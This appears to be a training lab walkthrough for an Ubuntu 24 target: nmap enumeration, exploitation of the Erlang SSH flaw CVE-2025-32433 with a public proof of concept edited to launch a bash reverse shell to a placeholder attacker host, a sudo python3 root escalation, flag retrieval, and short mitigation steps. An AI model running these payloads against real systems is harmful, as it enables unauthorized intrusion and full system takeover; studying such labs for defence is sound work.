# Lab 2: Ubuntu 24 – Exploitation & Mitigation

---

## 🔎 Linux Enumeration Phase

**Tool used:** nmap

We begin by performing an initial scan of the target machine to identify exposed services and potential entry points. The following command provides a thorough scan across all ports with enhanced output for analysis:

```bash
nmap -sC -sV -p- <VICTIM_IP> -vvv
```

### Command Breakdown

- **-sC**: Executes Nmap's default scripts, which include common enumeration checks (e.g., service detection, vulnerability probing, etc.).
- **-sV**: Enables version detection to identify the specific versions of services running on open ports.
- **-p-**: Scans all 65,535 TCP ports instead of the default top 1,000.
- **-vvv**: Produces highly verbose output, helpful for understanding the scan's progress and results in detail.

This scan provides a comprehensive overview of the machine's exposed surface and will be the foundation for identifying possible vulnerabilities.

---

## 🔍 Service Enumeration Analysis

We’ll observe only one open port that may indicate a potential vulnerable service:

```text
PORT     STATE SERVICE REASON         VERSION
2222/tcp open  ssh     syn-ack ttl 64 (protocol 2.0)
| fingerprint-strings: 
|   NULL: 
|_    SSH-2.0-Erlang/5.1.4.7
```

After this quick scan we already have the name of the service running “Erlang” and even it’s version “5.1.4.7”, if we do a quick google search on “Erlang/5.1.4.7 CVE” we will quickly find that this version of Erlang is vulnerable to CVE-2025-32433, we can now search for an exploit for it.

---

## 💥 Vulnerable Service Exploitation - CVE-2025-32433

There are several public exploits available for CVE-2025-32433. In this walkthrough, we'll use the following Python-based proof of concept and slightly modify it to gain a reverse shell:

Exploit Repository:
https://github.com/ProDefense/CVE-2025-32433

### 📥 Step 1: Download and Prepare the Exploit

```bash
git clone https://github.com/ProDefense/CVE-2025-32433.git
cd CVE-2025-32433
nano CVE-2025-32433.py
```

Replace the command value with:

```python
command='os:cmd("bash -c \"bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1\"").'
```

Make sure to replace `<ATTACKER_IP>` and `<PORT>`.

---

### 📡 Step 2: Start the Netcat Listener

```bash
nc -lnvp 4444
```

---

### 🚀 Step 3: Run the Exploit

```bash
python3 CVE-2025-32433.py
```

If successful, you should receive a reverse shell.

---

## 🧑‍💻 Retrieving the User Flag

Verify the current user context:

```bash
whoami
```

Navigate to the Desktop directory:

```bash
cd /home/vdoom/Desktop
cat user_flag.txt
```

✅ You have now recovered the low-privilege user flag.

---

## 🧗 Privilege Escalation – Gaining Root Access

Check sudo permissions:

```bash
sudo -l
```

Exploit sudo python permission:

```bash
sudo /usr/bin/python3 -c 'import os; os.system("/bin/sh")'
```

Verify root access:

```bash
id
```

---

## 👑 Retrieving the Root Flag

```bash
cd /root
cat flag.txt
```

✅ You’ve now recovered the root flag.

---

## 🛡️ Mitigation Phase

### 🔍 Step 1: Detect the Erlang Vulnerability

Use Vicarius vRx detection script for CVE-2025-32433.

---

### 🛠️ Step 2: Remediate the Vulnerability

Run the remediation script from the Vicarius dashboard.

---

### 🔍 Step 3: Detect the Misconfigured Sudo Binary

Run the **“Detect Risky Sudo Permissions”** script.

---

### 🛠️ Step 4: Remediate the Misconfigured Sudo Python Binary

Run the **“Remove Sudo Risky Permissions”** script.

---

